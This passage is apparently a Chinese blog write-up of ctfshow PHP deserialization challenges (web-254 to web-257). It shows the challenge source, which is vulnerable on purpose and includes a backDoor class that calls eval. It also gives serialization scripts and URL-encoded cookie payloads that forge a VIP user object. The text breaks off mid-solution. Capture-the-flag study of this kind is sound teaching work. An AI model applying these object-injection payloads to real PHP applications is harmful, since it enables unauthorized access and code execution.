class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题目没什么，用不到反序列化，直接GET传参username和password的值与源码中一样即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure><hr><h2 id="web-255"><a href="#web-255" class="headerlink" title="web-255"></a>web-255</h2><p>分析源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题和上一题的不同就在与，它在赋值时会从cookie中获取user的值<br>这里是unserialize，所以只需要将cookie中user值改为new ctfShowUser();的内容即可,又因为只有$this-&gt;isVip是true才能是flag，所以反序列化的内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br>注意这里需要先url编码<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span>xxxxxx<br><br>hackbar<br>Cookie：user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png"></p><p>在hackbar中使用cookie和get方法传值即可拿到flag</p><hr><h2 id="web-256"><a href="#web-256" class="headerlink" title="web-256"></a>web-256</h2><p>首先看题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题和上一题不同的是多了一个判断，即username!&#x3D;password，所以只要get方法传值的时候让username和password不等即可<br>所以构造代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;123&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?username<span class="hljs-operator">=</span>xxxxxx&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span><br><br>hackbar：<br>Cookie：user<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ctfShowUser<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>username<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">6</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>xxxxxx<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>password<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22123</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>isVip<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bb<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p><img src="/../image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png"></p><hr><h2 id="web-257"><a href="#web-257" class="headerlink" title="web-257"></a>web-257</h2><p>源码分析：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="language-php"># -*- coding: utf-8 -*-</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Author</span>: h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span></span><br><span class="hljs-comment"><span class="language-php"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span></span><br><span class="hljs-comment"><span class="language-php"></span></span><br><span class="hljs-comment"><span class="language-php">*/</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span></span><br><span class="hljs-class"><span class="language-php">    &#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php">&#125;</span></span><br><span class="hljs-class"><span class="language-php"></span></span><br><span class="hljs-class"><span class="language-php"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;</span><br><span class="language-php">    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);</span><br><span class="language-php">    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);</span><br><span class="language-php">&#125;</span><br></code></pre></td></tr></table></figure><p>这道题用了魔术变量__construct和__destruct</p><p>__construct 是 PHP 中的一个特殊方法，也被称为构造函数。它用于在创建对象时初始化对象的属性或执行其他必要的设置操作。</p><p>当你使用 new 关键字创建一个对象时，PHP 会自动调用该类的构造函数。构造函数没有返回值（也不应该有返回值），并且其名称总是 __construct</p><p>__destruct&#96; 是 PHP 中的一个魔术方法（magic method），也被称为析构函数。当对象不再被引用或者脚本执行完毕时，PHP 会自动调用这个析构函数来执行一些清理操作。</p><p>析构函数主要用于执行一些清理任务，比如关闭数据库连接、释放文件句柄、释放锁等。当对象被销毁时，析构函数会自动被调用，因此不需要显式地调用它。</p><p>所以构造代码：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 